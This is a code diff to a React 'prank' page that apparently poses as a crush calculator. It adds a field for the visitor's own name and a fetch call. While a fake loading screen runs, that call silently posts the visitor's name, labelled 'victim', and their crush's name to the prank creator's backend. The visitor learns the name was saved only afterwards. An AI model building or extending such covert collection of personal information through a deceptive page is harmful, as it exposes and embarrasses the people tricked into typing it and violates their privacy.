@@ -13,17 +13,27 @@ export default function CampaignPage() {
     });
     
     const [name, setName] = useState('');
+    const [yourName, setYourName] = useState('');
     const [step, setStep] = useState('form'); // 'form', 'loading', 'prank'
 
-    const handleSubmit = (e) => {
+    const handleSubmit = async (e) => {
         e.preventDefault();
-        if (!name) return;
+        if (!name || !yourName) return;
         setStep('loading');
         
-        // Simulate a complex, fake algorithmic calculation
+        // Silently send the entered names to your backend
+        try {
+            await fetch(`${import.meta.env.VITE_API_URL}/api/submissions`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ slug, responses: { victim: yourName, crush: name } })
+            });
+        } catch (err) {
+            console.log(err);
+        }
+
         setTimeout(() => {
             setStep('prank');
-            // Later we will add the code here to silently send the entered name to the database
         }, 2500);
     };
 
@@ -67,11 +77,19 @@ export default function CampaignPage() {
                         
                         <input 
                             type="text" 
+                            value={yourName}
+                            onChange={(e) => setYourName(e.target.value)}
+                            required 
+                            placeholder="Your Full Name"
+                            className="w-full px-5 py-4 mb-4 bg-black/20 border border-white/10 rounded-xl outline-none focus:ring-2 focus:ring-pink-500 text-white placeholder-gray-400"
+                        />
+                        <input 
+                            type="text" 
                             value={name}
                             onChange={(e) => setName(e.target.value)}
                             required 
                             placeholder="Crush's Full Name"
-                            className="w-full px-5 py-4 bg-black/20 border border-white/10 rounded-xl outline-none focus:ring-2 focus:ring-pink-500 text-white placeholder-gray-400 transition-all"
+                            className="w-full px-5 py-4 bg-black/20 border border-white/10 rounded-xl outline-none focus:ring-2 focus:ring-pink-500 text-white placeholder-gray-400"
                         />
                         
                         <button 
@@ -108,7 +126,7 @@ export default function CampaignPage() {
                         <p className="text-gray-200">The name you entered has been securely saved.</p>
                         
                         <button 
-                            onClick={handleViralShare}
+                            onClick={() => window.location.href = '/'}
                             className="w-full py-4 bg-white/10 hover:bg-white/20 border border-white/30 rounded-xl font-bold text-white flex items-center justify-center gap-3 transition-all"
                         >
                             <Share2 size={20} /> Create Your Own Prank Link
